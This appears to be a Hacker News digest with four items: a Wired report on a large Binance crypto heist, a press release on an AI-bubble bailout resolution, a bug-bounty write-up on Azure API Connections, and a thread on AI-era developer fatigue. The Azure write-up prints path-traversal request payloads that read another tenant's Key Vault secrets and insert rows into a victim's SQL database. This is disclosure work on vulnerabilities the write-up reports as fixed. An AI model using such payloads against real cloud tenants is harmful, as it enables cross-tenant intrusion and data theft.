item.title: The $6.3B Binance Hack Was Pulled Off in Just 20 Minutes (281 pts)
item.description:
URL: https://www.wired.com/story/the-dollar63-billion-binance-hack-was-pulled-off-in-just-20-minutes/, See on Hacker News

Cryptocurrency firms and investigators are racing to freeze and track down billions of dollars of stolen digital cash following what appears to be the largest crypto heist of all time. On Thursday, starting at around 4pm ET, hackers started quickly siphoning around $6.3 billion in cryptocurrencies, spread across multiple blockchains, from wallets belonging to crypto exchange Binance.

Following the theft, Binance almost immediately suspended all deposits and withdrawals from its services as part of its investigation into the hack and says it is working to identify who was behind the breach. The company, along with other crypto firms, says it has so far been able to freeze around half of the stolen funds—essentially stopping hackers moving the money further or trying to cash it out. Much of the remaining crypto may not be possible to freeze, however.

Three crypto tracing firms have been quick to link the attack potentially to North Korean hackers. “We think North Korea is likely responsible,” Tom Robinson, chief scientist and cofounder of Elliptic, tells WIRED. “If North Korea is behind it, this one theft would almost double everything the regime has stolen in crypto to date.”

The majority of the stolen crypto was taken in a period of around 20 minutes on October 29, according to analysis by crypto tracing firm TRM Labs. Wallets belonging to Binance across at least ten blockchains—including Ethereum, Bitcoin, Tron and Solana—were drained and sent to multiple addresses controlled by a single attacker, according to TRM’s analysis. “Preparation began at least 36 hours before the theft,” TRM says in a blog post. The company says one of the attacker’s wallets received three small withdrawals during a test period, before later expanding the operations.

“Early on October 29, the operator deployed a first piece of code for the attack and tested it on two wallets,” TRM says. “Later that day, it rehearsed the final version on a third wallet, then routed the test funds back to itself. Four hours after that rehearsal, the same code was installed on a Binance hot wallet.” Hot wallets are cryptocurrency wallets that are internet connected and allow crypto exchanges to handle customer withdrawals. Analysts say the funds were drained from hot wallets across the impacted blockchains.

The tactics used in the hack appear to mimic previous methods used by an elite subset of North Korean hackers, known by the name TraderTraitor. Crypto tracing firms TRM Labs and Chainalysis both say they believe TraderTraitor may be behind the attack, while Robinson says Elliptic hasn’t specifically tied it to the group but sees overlaps in the activity.

Neither Binance nor law enforcement officials have named any suspected links between the attack and North Korean hackers. Over recent years, North Korean hackers have repeatedly targeted cryptocurrency firms and stolen hundreds of millions in crypto heists. Multiple North Korean hacking groups can target companies in the sector, but TraderTraitor have become specialists, pulling off infrequent but high profile attacks.

Within North Korea’s sprawling hacking operations—often designed to earn money for the highly sanctioned and repressive regime—TraderTraitor has stood out in recent years for its sophistication and targeting of crypto and decentralized finance companies. Last year, the FBI named TraderTraitor as being responsible for the $1.5 billion hack against crypto exchange Bybit.

Binance did not answer WIRED’s questions about whether it believes North Korean hackers are behind the colossal heist, pointing towards a statement saying it will cover all losses from the hack and is working with law enforcement officials to identify who is responsible.

“Our initial investigation suggested that the security incident may have involved a compromised laptop, however, our subsequent investigation has uncovered additional points of breach,” the company says in a statement. “This was a complex attack, and we are doing all we can in coordination with law enforcement to resolve it.”

“These folks in particular are somewhat artists in terms of getting into these distributed finance organizations,” Rafe Pilling, a senior director of threat intelligence at security company Sophos, tells WIRED. “TraderTraitor seems to focus on these larger operations. In the past, they’ve developed their own fake applications and tried to use those to get inside organizations.”

TRM and Chainalysis have initially linked the attack to TraderTraitor and say the determinations are based on their analysis of both on-chain and off-chain activity. “​​The strongest evidence emerged when Chainalysis investigators observed, in real time, funds stolen from Binance commingling with funds stolen in last month’s Bitget exploit, which had been attributed to North Korean actors,” a research blog from Chainalysis says.

“Binance says the attack began with a compromised engineer’s laptop. Targeting crypto company staff is a TraderTraitor hallmark,” Elliptic’s Robinson says. “The attacker funded their wallet through Tornado Cash and rehearsed the attack in advance, as in Bybit.”

While around $3 billion of cryptocurrency was initially frozen in the aftermath of the attack, it is likely those behind it could still potentially take away huge sums as not all of the stolen crypto can be frozen. Research from Chainalysis says the company is seeing money “laundering patterns we have not seen before” and that thousands of transactions being quickly processed indicates that they are using “automation to obscure the trail of funds.”

Elliptic’s Robinson says that around $2.8 billion, or around 44 percent of the total amount stolen, has been frozen by crypto companies and exchanges so far, with almost all of this being stablecoins. “The remaining $3.3 billion is mostly Bitcoin, Ether, and XRP, which no one can freeze,” Robinson says. “It can only be stopped when it reaches an exchange or other service. Some will be caught over the coming months, but I don’t expect the frozen share to rise much further.”

item.title: US Reps Lead Democratic Resolution Opposing A.I. Bubble Bailout for Big Tech (609 pts)
item.description:
URL: https://progressives.house.gov/2026/10/reps-casar-waters-lead-democratic-resolution-opposing-a-i-bubble-bailout-for-big-tech-commit-to-protecting-american-people-instead, See on Hacker News

Washington, D.C. — Today, Congressional Progressive Caucus (CPC) Chair Rep. Greg Casar (TX-35) and House Financial Services Committee Ranking Member Rep. Maxine Waters (CA-43) co-led the introduction of a resolution warning of the economic risks posed by an artificial-intelligence-related asset bubble, opposing a bailout of corporations or their business executives impacted by the collapse of an A.I. bubble, and affirming their support for aggressive federal action to protect workers, retirees, and low-income communities who will be harmed by an economic downturn.

They were joined by Representatives Danny Davis (IL-07), Chris Deluzio (PA-17), Valerie P. Foushee (NC-04), Jesús “Chuy” García (IL-04), Pramila Jayapal (WA-07), Analilia Mejia (NJ-11), Delia Ramirez (IL-03), André Carson (IN-07), Jan Schakowsky (IL-09), Brad Sherman (CA-32), and Rashida Tlaib (MI-12).

“Big Tech billionaires are making increasingly reckless bets on A.I. They got richer off Trump’s deregulation and Republican tax breaks. Now they expect taxpayers to bail them out if those bets go bad. We won’t let them," said CPC Chair Casar. "A.I. companies that fail should go bankrupt, and executives who commit fraud should be held accountable. Federal help should go to workers and retirees.”

“Big tech and Wall Street are taking enormous risks with billions in borrowed money to fuel the AI boom, despite growing warning signs of a dangerous bubble and if it all comes crashing down they should not expect taxpayers to rescue them,” said Ranking Member Waters. “We saw what happened in 2008 when reckless Wall Street practices brought our economy to its knees. The banks got bailed out while millions of hardworking Americans lost their jobs, homes, and retirement savings. We cannot let history repeat itself. The American people should never again be forced to foot the bill for billionaires’ reckless bets.” 

In the resolution, the Democratic lawmakers note that “artificial intelligence-related firms hold trillions of dollars in debt, much of which is raised in opaque and unregulated private credit markets,” and “the price-to-earnings ratio of the stock market is currently almost as high as it was at the peak of the 1990s tech bubble.” 

The Democratic legislators also point out that “federal regulators have avoided applying robust scrutiny and oversight regarding enormously complicated debt and equity schemes used by artificial intelligence firms” and highlight the Trump White House’s deregulatory focus and conflicts of interest related to A.I.

The resolution’s cosponsors commit to avoiding a federal response similar to what occurred during the financial crisis of 2008, where the financial sector received trillions of dollars in liquidity without accountability for senior executives involved in illegal and fraudulent behaviors. Meanwhile, 10 million homeowners lost their houses and tens of millions of workers went years without adequate employment while too-big-to-fail banks enjoyed a massive bailout.

The resolution urges the Federal Government, including Congress and key Federal agencies to oppose:  

  • Any measure to rescue insolvent artificial intelligence-related firms or to shield their senior executives from accountability for reckless conduct;

  • Special assistance like emergency lending or direct capital infusions to prop up insolvent A.I. companies’ operations or prevent their orderly resolutions through ordinary bankruptcy processes;

  • “Golden parachutes” for corporate executives involved in risky or illegal behaviors that lead to their firms’ insolvency, instead requiring them to be held fully accountable under civil and criminal law and be obligated to return ill-gotten gains like mansions, vacation homes, private planes and yachts, and other assets.

The resolution also calls on the Federal Government to support: 

  • Aggressive, direct federal action to support ordinary Americans through federal spending to create jobs, protect state and local government services, and robust unemployment insurance, nutrition support, and housing assistance;

  • The protection of pension and retirement fund holders who may face devastating losses in the event of a collapse of an A.I. bubble;

  • Far-reaching reforms to prevent future speculative bubbles, including additional transparency and accountability requirements;

  • Automatic economic stabilizers—investments in people that start to flow immediately in the event of an economic downturn—that support workers and consumers when financial crises, asset bubbles and other harms create downturns and recessions.

The resolution was endorsed by American Federation of Teachers, American Economic Liberties Project, Americans for Financial Reform, the Center for Responsible Lending, Demand Progress Action, Future of Life Institute, Guardrails Action, Indivisible, Interfaith Centre on Corporate Responsibility, Investor Alliance for Human Rights, Jobs With Justice, P Street, and Social Security Works.

“Americans are already paying for the AI build-out through higher power bills and a stock market propped up by a handful of companies,” said Morgan Harper, Director of Policy & Advocacy for American Economic Liberties Project. They should not pay a second time with a bailout. When Wall Street’s bets went bad during the financial crisis, the banks got rescued and ordinary people got foreclosure notices. Congressional members are right to reject AI bailouts in advance, and commit to saving real help for those who will be left holding the bag—the American people.”

“Tech billionaires and their Wall Street backers are using dangerous tactics reminiscent of the 2008 financial crisis to make trillion dollar bets on AI—and they are putting working people’s money at risk,” said Maya Jenkins, a senior policy analyst at Americans for Financial Reform. “This resolution charts a critically important path for defending people’s economic security from the bubble’s blast radius, opposing billionaire bailouts, and holding corporate executives to account. This is the kind of approach needed to confront mounting financial risks and emerge from the aftermath of the AI bubble with an economy that is fairer and more stable.”

“When the housing market collapsed in 2008, the financial industry was prepared to act to ensure that there was a bailout that benefited them,” said Dean Baker, senior economist at the Center for Economic and Policy Research. “It is important that the Congressional Progressive Caucus is stepping forward to make sure that any bailout from the collapse of the AI bubble is designed to benefit the country as whole, rather than the billionaire AI boys who created the problem in the first place.” 

“Chair Casar, Ranking Member Waters, and the Progressive Caucus should be praised for this resolution and recognized as being at the tip of the spear in ensuring that AI policy focuses on working-class impacts and isn’t simply left to the desires of the handful of billionaires and their courtesans in Congress, said Maya Handa, Senior Advisor, Guardrails Action. “The AI industry is trying to buy our elections and write their own regulations while its biggest players line up IPOs at record valuations. If this turns into a bubble, working-class Americans must not be forced to pay the tab for big tech CEOs’ recklessness and greed. Simply put: there can be no bailout for big AI execs or their financial enablers.” 

“AI companies and their billionaire executives shouldn’t get to gamble with our economy and democracy, then expect working people to bail them out when their bets on AI go bust,” said Andrew O’Neill, National Advocacy Director of Indivisible. “We learned in 2008 what happens when the government puts impunity for corporate corruption ahead of working families. This resolution draws a clear line: will lawmakers protect AI tech bros or the people they’re supposed to represent?”

Read the resolution here.

###

The Congressional Progressive Caucus (CPC) is made up of nearly 100 members standing up for progressive ideals in Washington and throughout the country. Since 1991, the CPC has advocated for progressive policies that prioritize working Americans over corporate interests. The CPC champions policies including comprehensive immigration reform, good-paying jobs, fair trade, universal health care, debt-free college, climate action, and a just foreign policy. The caucus is the leading voice calling for bold and sweeping solutions to the urgent crises facing this nation, including ending America’s broken for-profit health care system, raising American wages, eliminating political corruption, supporting the labor movement, and taking action to protect the planet for generations to come.

item.title: Azure's Weakest Link – Five Full Cross-Tenant Compromises (237 pts)
item.description:
URL: https://www.binarysecurity.no/posts/2026/10/one-root-case, See on Hacker News

In my previous blog posts, Azure’s Weakest Link? and Azure’s Weakest Link - Full Cross-Tenant Compromise, I gave an overview of the severely insecure architecture behind API Connections in Azure, a part of Azure Logic Apps, and an instance of a full cross-tenant compromise using these inherent flaws. Now I am back with some more vulnerabilities in this system, each giving the same primitives to the attacker. In total, the vulnerabilities here netted me a cool $200,000.

I also held a talk detailing this at Blue Hat Asia 2026, and when the recordings are out, I will add a link here.

TL;DR

API Connections allow anyone to fully compromise any other connection worldwide, giving full access to the connected backend. This includes cross-tenant compromise of Key Vaults and Azure SQL databases, as well as any other externally connected service, such as Jira or Salesforce. The only thing stopping exploitation is really the layers of input validation bolted onto the various systems, but as you will see, it is really difficult to catch all the edge cases here.

Architecture

If you haven’t read the first parts of this series, I would recommend checking those out first, Azure’s Weakest Link? - Part 1 and Azure’s Weakest Link - Full Cross-Tenant Compromise, but if you don’t care, I will go through the most important parts of the architecture first.

From Microsoft’s documentation, we see a quite intriguing diagram of how the API Connection architecture is built.

This basically spells out all that is needed to understand how the system operates, kudos to whoever made it!

It works like this

  1. A logic app, the symbol on the bottom left, queries a shared Azure API Management instance
  2. The API Management instance first checks the swagger (OpenAPI) definition of the connector type and checks that it is a valid action
  3. A sort of key exchange happens where the input token, or key, is exchanged for the configured token for the backend service
  4. The API Management instance finishes the call with this new token to the backend instance.

From this, we can surmise that if we are able to trick the API Management instance to operate on a different connection than the ones we own, we would be able to effectively use the configured token for a victim’s connection on their backend service.

This service can, in effect, be anything. As you can see here, the list of backend services is effectively unbounded and includes a number of Azure services.

However great the diagram is, there is one crucial omission, which we have already used to great effect in part 2 of this series. By using the ARM REST API DynamicInvoke or /extensions/proxy/ endpoints, we can directly query the APIM service through ARM. I have taken the liberty of updating the diagram to match this.

Considering this, and the fact that, as a resource manager, ARM basically has full access to everything, our exploitation pathway becomes clear. We must trick the calling service into querying a different connection than ours, and thus get full control of the backend service.

Caveat: It is, of course, possible for the people who set up these connections to scope their access tokens or keys so that the API Connection has minimal privileges in the backend. I would guess, however, that this is rarely done. In the case of OAuth connections, it will surely always be the token of the person who initially made the connection. And for the API key case, well, who cares enough to scope such things minimally? Microsoft doesn’t, at least.

Initial Exploitation

The first cross-tenant exploitation I achieved in API Connections, and in fact in Azure as a whole, has already been described in part 2. As a recap, here is an example payload using the DynamicInvoke endpoint of my own connection to read the Key Vault of a different tenant.

POST /subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/token-storer/providers/Microsoft.Web/connections/custom2/DynamicInvoke?api-version=2018-07-01-preview HTTP/2
Host: management.azure.com
Authorization: Bearer <token>
Content-Type: application/json
Content-Length: 147

{
    "request":{
        "method":"get",
        "path":"path/%2e%2e/%2e%2e/%2e%2e/%2e%2e/apim/keyvault/fd8d0f4f4069495991ccb4974f96a1ed/secrets/victimsecret/value"
    },
}


HTTP/2 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 1329


{
    "response": {
        "statusCode": "OK",
        "body": {
            "value": "dontreadme",
            "name": "victimsecret",
            "version": "7914d45aa60342809fb8cc12dc68b10e",
            "contentType": null,
            "isEnabled": true,
            "createdTime": "2025-04-04T05:38:26Z",
            "lastUpdatedTime": "2025-04-04T05:38:26Z",
            "validityStartTime": null,
            "validityEndTime": null
        },
        "headers": {
            <Headers>
        }
    }
}

As you can see, it’s a pretty clear path traversal vulnerability. This implies what we already assumed: When the request fires from ARM to the APIM instance, it has rights to all connections, regardless of what it operates on.

Further exploitation

A couple of weeks after I reported this vulnerability, it got marked as fixed, and when I tried it again, the following error message greeted me:

Now, I considered whether or not this was a sufficient fix. It seemed to restrict the paths allowed, rather than the underlying token issue, so I guessed there would be ways around it.

An interesting little fact about the ARM API is that, in some cases, it might not be as much of a black box as you assume. The relevant code can sometimes be found within the resource types themselves. I do not know whether this code actually executes on these machines or is merely included as an artifact, but it is a gold mine of interesting information. So, I created a Standard Logic App, which provides a fully dedicated host, SSHed into it, and extracted the code. Lo and behold, look what I found:

Can you see the fix they implemented?

What was even more interesting here actually was something I found, and was not really even looking for. When searching for the actual DynamicInvoke code, what greeted me was not actually just this one public function, but four:

These functions are completely undocumented, and I could find no reference to them anywhere. However, they were reachable and located along the same path. So, for instance, to hit DynamicList here, simply change dynamicInvoke in your URI to DynamicList.

Knowing that the slap-dash blacklisting fix that they implemented only applied to DynamicInvoke, I assumed that these would all be vulnerable in the same way if they had the same functionality. Without boring you too much with the required arguments and return values here, the exploitation method is really quite the same, although the payload is a bit more involved. For DynamicList, you need to specify each path parameter on its own and do a bit of work to get a result, but the same logic applies. To achieve, for instance, a cross-tenant write on a victim’s SQL server through their connection, a payload like this works:

POST /subscriptions/162fc6db-03cd-4fe8-ab44-dc0a947e74af/resourceGroups/api-connection/providers/Microsoft.Web/connections/custom_validator/DynamicList?api-version=2018-07-01-preview&_=1765372176638 HTTP/2
Host: management.azure.com
Authorization: Bearer <token>
Content-Length: 524
Content-Type: application/json


{
    "dynamicInvocationDefinition": {
        "operationID": "nine",
        "parameters": {
            "one": {
                "value": ".."
            },
            "two": {
                "value": ".."
            },
            "three": {
                "value": "sql"
            },
            "four": {
                "value": "88d28f5ff7b642cfb91df184938d074c"
            },
            "five": {
                "value": "v2"
            },
            "six": {
                "value": "datasets"
            },
            "seven": {
                "value": "victimservice.database.windows.net,VictimDatabase"
            },
            "eigth": {
                "value": "query"
            },
            "nine": {
                "value": "sql"
            },
            "query": {
                "value": {
                    "query": "Insert INTO MySecrets VALUES ('NewEvilSecrets', 3)"
                }
            }
        },
        "ItemsPath": "ResultSets/Table1",
        "ItemValuePath": "secrets",
        "ItemTitlePath": "value"
    }
}

You can quite easily see that the first parameters here execute the path traversal and then perform an arbitrary SQL query on the database.

I reported only the DynamicList case first, in the hope that they would perform a similar fix to DynamicInvoke and I would get to report on the other two as well. Sadly, their fix involved simply blocking all these endpoints. No other mitigations seem to be in place, however, so if these endpoints ever become accessible again, I would assume they would be vulnerable.

Further exploitation

Messing around with paths in these dynamic calls seemed to have reached its conclusion: I couldn’t get past the path limitations on DynamicInvoke, and all the other endpoints were blocked. What I needed was a different way in. As I was trying to sleep one day, it occurred to me that I had overlooked using the Logic Apps themselves. I realized that there was, in fact, a significant difference between the Consumption and Standard Logic Apps connection-creation flows. The most glaring difference is that Consumption Logic Apps, where your workflow is co-located with a bunch of others, create a Version 1 connection, while the dedicated-host Standard Logic Apps create a Version 2 connection. The following diagrams make a more subtle difference between the flows clear:

Do you see the difference? Obviously, when it’s spelled out like that, it’s pretty clear what the point is. Using a Standard Logic App, after we have created the resource and added whatever authentication to the backend server we need, we authorize that specific logic app to access it using its managed identity. However, when we have a Consumption Logic App, we don’t have any such identity to authorize because we don’t control it. This perhaps makes some sense: we can’t authorize it, so we don’t.

I realized that this must imply that every Consumption Logic App has implicit access to every Version 1 API Connection; the only thing stopping us from exploiting this must be some sort of input validation.

The classic view of a Logic App workflow is quite restrictive in its input, but there are both the API endpoints, and the Code view in the GUI that allow us to play around a bit more with the inputs.

This allows us to see the inputs in more detail, edit them, and even add more. The obvious trick of changing the referenced connector to a victim’s connection fails, as the runtime performs extensive validation that you own the connection. We have the codebase, though, so we can try to find all the valid parameters. It did not take much searching for me to discover the host.api.RuntimeUrl parameter.

I can’t quite get my head around why this parameter is included, nor why it’s still accepted to this day, but it works in the way you would expect. After performing a series of validations on the connection referenced in host.connection, you can specify that it should use something completely different instead of the runtimeUrl baked into that connection. As long as the host ends with azure-apihub.net, it will also include the required Authorization header.

What happens when this workflow is run then?

The keen-eyed reader might notice that the runtimeUrl used in the exploit is not just the connectionId. This is because some extra elements get added to the URI, but it is of no consequence to us; the exploit works fine.

Manna from the heavens

I, of course, reported this to Microsoft again, and they spent some time working up a fix. When it finally came through, the exploit returned an error message:

The host API runtime URL is not valid for the API connection '/subscriptions/8e3ce52f-d45b-4347-8705-65892507465e/resourceGroups/token-storer/providers/Microsoft.Web/connections/keyvault-1'. The runtime URL path must match the expected API endpoint 'https://logic-apis-norwayeast.azure-apihub.net/apim/keyvault/cbfb0f4313144117a7440368902bb871?' for the referenced connection. Either omit the 'host.api' input property, or correct the runtime URL to match the API associated with the connection.

Except for the excessive length of this message, it seems like quite a suitable fix. The runtime URL must exactly match what is expected; otherwise, no dice. Apart from just removing the parameter altogether, it’s quite sane. Unless, of course, it checks that value at the wrong time:

This works again, with the same result. What’s going on here is that the validation happens before the path is normalized, so the runtime thinks the URI is pointing to my referenced connection, but the APIM instance sees it differently.

And just like that, I got another critical vulnerability.

The fun does not stop there. When Microsoft managed to scrape together a fix for this path traversal, a surprising thing happened. The original RuntimeUrl path was no longer validated, and as a result, you could perform that attack again. I would include some pictures, but they would be the same pictures as above, so you can just imagine them.

Reporting and rewards

Altogether, API Connections have netted me five critical elevation-of-privilege vulnerabilities in Azure, which is perhaps more than expected. All vulnerabilities reported here were fixed within a reasonable time after I submitted the reports, and while there were some disagreements with MSRC along the way, overall, I am quite happy with the results.

item.title: HNInternal: Ask HN: Are you tired too in this AI era? (134 pts)
item.description:
See on Hacker News


It's weird times.

I feel incredibly productive. I'm building in an afternoon what would've taken weeks. I spend all my time in either MR's reviewing code, or a terminal prompting.

I've moved from being a coder, to being a product-engineer-architect. I love coding -- LOVE it. But the role has morphed. And, I actually really like the new role. I love being product centric, and caring about architecture -- it suits me wel..

The code Claude produces is often clean, but terribly archictected. So I'm spending a lot of time reviewing in detail.

But the anxienty - OMG the anxiety.

I work on multple features (generally 4-5 work streams) concurrently, so am constantly context switching. I worry about how much time I'm spending on each task. Am I doing enough code review? Too much? Too little?

What about click-through testing? Our test coverage has never been higher - should I be able to just merge these features? Wasn't that always the promise of TDD - merging with confidence? But, it feels like a risk.

And, I'm moving really really fast - but I assume my competitors are too. So that drives me to move faster. Automate more. Use claude in more places. Which brings more anxiety - am I cutting too many corners? Is this all gonna crumble on me?

Also, is everything I'm working on going to become irrelevant? Will customers buy this product, or vibe code it? Do we even have a moat? Anxiety. More anxiety.

My investors are reading stuff constantly too. They're pinging me with market updates, emerging players, shifting landscapes. More anxiety. Also - productivity tools - look - internet influencer X is now producing a gajillion lines of code a second -- are we doing that? Are we token maxing? Are we feature maxing?

Are we building the right number of internal tools? Are we automating enough? Should I evaluate the market for this new tool, or just smash something out with claude? More features. Burn more tokens. Ship ship ship.

Having to explain to investors why we're not going as fast as those guys, and building enterprise products requires care and dedication -- that takes time. Time I should be shipping, coding, featuring, tokenizing. More anxiety.

I'm exhausted.

Anyway, gotta go - herdr has pinged me four times during writing this reply. Gotta ship.


Some questions that bother me:

Are people reviewing all the tests that have been created automatically?

What about existing tests? How do we make sure that AI does not fake them (by silent changes or by faking the test output)?

edit: corrected typo


>Are people reviewing all the tests that have been created automatically?

No.

> How do we make sure that AI does not fake them by silently (by silent changes or by faking the test output)?

I have never seen this happen for a couple of months at least.


You seem to forget what tests are.

They're representative of scenarios which your application can enter.

So if the tests were mocked and a bug went live he'd still notice, after all it means your software behaved incorrectly and now you gotta clean up the pieces.


This is becoming cyclical, did you forget what this comment chain went about?

The discussion went from tests being written by ai, to nobody actually reviewing the tests, to the claim that given those circumstances, you wouldn't notice that the tests may not tests anything anymore because of mocks.

My statement was merely pointing out that your previous comment was groundless because they still would've found out about those bugs when they went live.


>My statement was merely pointing out that your previous comment was groundless because they still would've found out about those bugs when they went live.

Maybe. You're assuming visible and obvious bugs.


That's a big issue in my team. We cannot really review tests manually, we already have too much just reviewing the code. And even then, sometimes the 'is this change necessary' question is forgotten or ignored (happened to me 20 minutes ago) because I an tired of fighting my junior+AI. I try to make AI refactor the tests every weeks ande that's it.


I am fighting context switching by

- spending more time upfront working with agent on intent of the change, then design, so agent does not try to work around issues in a way that I don't intend to

- investing in ways in which agent can verify it's own change

- giving access to as much prod telemetry, etc so it can also verify the change post-merge

- obvious stuff, like automated review loops etc

But in the end I still read the "load bearing" parts of the code. Less closely, and I've long ago stopped looking at the tests. It's better for me than couple of months ago.


I just had an interview and they asked me prepare for coding live. I had to manually code bubble sort before the interview. It felt really nice, but it ended up them showing me some code and review it instead :facepalm:


I feel so sorry for you and the kind of life you're building for yourself... I really hope this is a joke


I believe it.

I spend about 90% of at-computer time in a herdr-like tool.

It feels like playing factorio: whatever is manual needs to be automated away.

LLM writes the test. The test is crap. Update the skill. Ask an LLM to review your feedback on the last 5 PRs and write a skill for a review bot to look for similar problems and post. Now you only see PRs after they've gone through a few rounds of review.

The LLM has stopped picking up new issues. Ask an LLM to diagnose why. Ask an LLM to write a cron to regularly check if the LLM PR pipeline has halted and ping you. Get an LLM to try to diagnose it first.

I'm using a lot of LLMs! Ask an LLM to diagnose why. Write a tool to audit your usage, and produce a weekly report. Have it raise issue to reduce spending.

And like a base building game there are many competing facets, coming all at once.


Haha, I have been building my own software factory exactly like that. I consider it the ultimate factory game- but I sure as fuck would not want that to be my dayjob... Though I'm aware it will likely be that in a few years when the industries in my nation normalize around that.


Looks like written by an LLM, but it gives a realistic picture. The investors breathing down your neck is something that you don't want in this age, though.


It’s the exact opposite for me. I don’t get tired at all from using AI. I am one of the people who enjoy building and not necessarily coding. A part of me is sad that I don’t write code anymore, I did have a thought yesterday when reviewing a PR, but working is fun for me again.

What was making me tired was all the doom and gloom online. I stopped consuming certain news and stopped going on Reddit entirely and my outlook is noticeably better.

I haven’t cut out sad news entirely but I don’t read speculative opinions about things that don’t actually affect me.

In terms of the overload I find that the clearly defined problems have much more obvious solutions. Identify your pain points and use AI to build you a tool or reusable prompt to make your life easier. It’s a constant refinement process to figure out what helps you.

For example, I was having a hard time managing multiple sessions so I had it build a window manager with notifications and color coding based on session hooks and git issue/PR status. I’m comfortably up to 8-12 sessions working in different worktrees.


Refreshing take, what's bad of this AI period is all the anti-AI stuff around it.

Otherwise I've never been less stressed and chill in my working life.

I'm not sure if you could share the window manager but I'd love to get a glimpse of it, as it sounds interesting!


I am vey tired. I maintain Pinggy - my first bootstrapped startup and building Lumirank , my next one. But every day is a struggle of coping up with what is new and what 20 more competitors that corpped up yesterday are up to. Millions of lines of codes being written every day, I can not merge without knowing the overall architecture and flow. But I can't rest. Everyone is running.

Sometimes I feel please someone give me a job where I can work 12 hours a day - but the rest of the 12 hours I don't need to think about what will happen tomorrow.. It will still be less stressful.


> please someone give me a job where I can work 12 hours a day - but the rest of the 12 hours I don't need to think about what will happen tomorrow

Why do you dream about working 12h a day when 8h is pretty standard.


Just to emphasize the "but the rest of the 12 hours I don't need to think about what will happen tomorrow" part.


I am surprised of how many people here are claiming they review the results of multiple agents working on different prs at the same time constantly context switching between them.

I just focus on one, I use on purpose very short interactions because I want to check every single function directly and not a whole 300lines file or 2000lines pr just at the end. Probably I am going slower than most of you but I feel I retain the knowledge of my codebase almost as good as when I was the one writing the code directly, and my PRs get very few review comments

What get me tired the most is when people submit to me a pr to review and I see immediately they full vibe coded it and just delegate to me the actual hard work of correcting the nonsense written in it with a single prompt without interactions. The worst is when you ask someone why they implemented something that way and they answer with "well calude made it, I really didn't think about it, now that I read it it makes no sense indeed"


If someone sends you vibe coded code to review, then you are obliged to give them a vibe coded review answer right back at them. Make sure your vibe review prompt tells to agent to be as nit picky as possible. Maybe tell it to be intentionally contradictory with it's change requests. Keep answering with impossible vibe coded review answers when they get back to you and nothing else.

* insert melting face emoji here *


I'm similar. I work in a context where I am responsible for the code that is in production and need to know how it works and vouch for its correctness.

Even with short interactions though, the effort in reviewing adds up and I ended up building a tool to help with it: https://github.com/imron/crt

I can review in the tool, and it remembers which files I have seen/approved since a given commit, then I can leave comments against source code and have an agent pick up those comments over mcp so it has context when making corrections.


I’ve been assigning the copilot review thing on all of these PRs, but I’ve noticed lately it’s started writing really difficult to verify review comments. It would take you literally all day to understand and test the things it’s commenting to check if they actually are issues, so as a result we all just ignore whatever the copilot review says and no one does any review.


We have removed it now, but when we used it we tweaked it to tell us only what it thoughts were major issues and ignore the rest because we had the same exact problem. Most comments were garbage


The whole situation is suboptimal because the manager uses Claude to generate tickets, the developers copy and paste the whole thing in to Claude and then post a PR they didn’t understand a thing about, and then it gets to me and I just don’t have time to review 4000 lines of code. So it ships having not had a single person understand what it does or was even for.


Enforcing boundaries and saying no have gotten more important than ever, now that violation of either is automated at superhuman speeds.

FWIW, there might be a silver lining in this. A lot of dysfunction in the current state of tech can (IMO) be traced back to violation of boundaries. This might lead to a cultural shift. Though, that might also just be wishful thinking on my part.

___

> I would love to hear your tips, but still be relevant in this AI era, so my boss does not fire me.

If your boss fires you because you didn't multiply your performance by doing more work in the same time (without your compensation changing), that's not your fault but simply your employer trying to squeeze you harder and that not working out.

Always keep that in mind in these discussions.

Which isn't to say that you should not improve efficiency and all, but it needs to be organic. If something inorganic is asked, then the (moral) failure is on the asker and not the askee.


My entire life, I have found meaning in solving problems with code. With AI, this is no longer competitive. Now I develop more than ever and am more productive than ever, but it still doesn't feel as rewarding. I would like to go back.


When we get good at something, it results in flow state, but it also means that was mechanizable in a way and now AI is taking that away. So we are always grappling with the new and effortful. And the context switching, jeez. We need entirely new visualizations of work flow that recognizes we are now doing more, and in parallel. Wonder if this is how air traffic control people feel.


As someone who has retired from a programming career…

The AI era is, so far, not a problem. Obviously, my having retired is significant.

Last night I spent an hour with Claude (free tier) setting up a "modern" 6502 build environment for MacOS. By the time I went to bed I had 1) 6502 assembly syntax highlighting in VSCode, 2) was compiling 6502 assembly for the KIM-1 to generate a "paper tape" format, 3) pasting this paper tape binary into CoolTerm to send over TTY (1200-N-8-1) to my KIM-1 clone (PAL-2).

(If I'm tired it's because I excitedly stayed up later than usual to get Claude to help get this workflow working.)

On the other side of the world… a friend who is still at Apple tells me how other engineers at Apple are using Claude to make changes, create pull-requests on code he maintains with a, "Hey, can you approve this change?"

Now he has to go through the code diff that Claude generated…

Oh!, there's some stupid shit in that diff. Did the engineer who submitted the pull request even look at the code before submitting? Who knows. Either they did not or they were not qualified (or well-versed enough with the code) to spot the AI-fluff/crap.

So, yeah, that would suck—keep me busier than I would have been Antediluvian (thanks Claude, for suggesting that made-up Latin).


It’s a bit of a mixed bag for me. My brain thrives really well with keeping a lot of balls in the air at the same time and seeing quick progress and results, and I’ve always had a hard time finishing things because of the more “boring parts”, like writing documentation and proper tests etc. (yes I’m sorry for how it sounds)

But it’s not because I don’t think it’s important and that I don’t want to do it. I have a very engineering mind that likes to be thorough, and I feel like with AI I get to do all the “boring” parts, without it being boring. I get to spend more time on the architectural thinking and finding tests for edge cases, focusing on stakeholder needs and keeping the momentum by developing fast.

The biggest problem is that I’m losing grasps of the projects. I don’t review much anymore and I feel like I’m losing my ability to code.


I agree, I just mostly think of LLMs as tools that help me to complete tasks efficiently, I am not being fatigued by the AI though when it comes to projects, I let the AI write and I don't review code as much as I used to.


I tell it I am a chimp with a 3 inch brain so complexity beyond chimp scale is forbidden unless requested. And to apply theory of bounded rationality during all chimp interactions. Takes care of me like a spl circus animal.

I ask it for a quick complexity thermometer reading when ever the rabbit hole is looking like it might explode.

Also walking away from it every few hours and doing random simple mindless stuff has helped. Like I will go inspect my fish and plants. Try to have a chat with the cat, get others around to do a little dance etc etc.

I have a priest in the family who has to deal with lot of heavy duty stuff/people's problems. They train them not to get totally sucked in and loose themselves. He calls it grounding. Just simple mundane things to focus shift out of anything heavy.


I’m tired of exuberant hardware prices so that companies can shove AI down our throats on subpar products that work way worse than they did before.


There are multiple strings coming together here.

AI-generated code works great for me, most of the time. I'm productive, I ship, I can show stakeholders stuff in no time and and they are mostly happy.

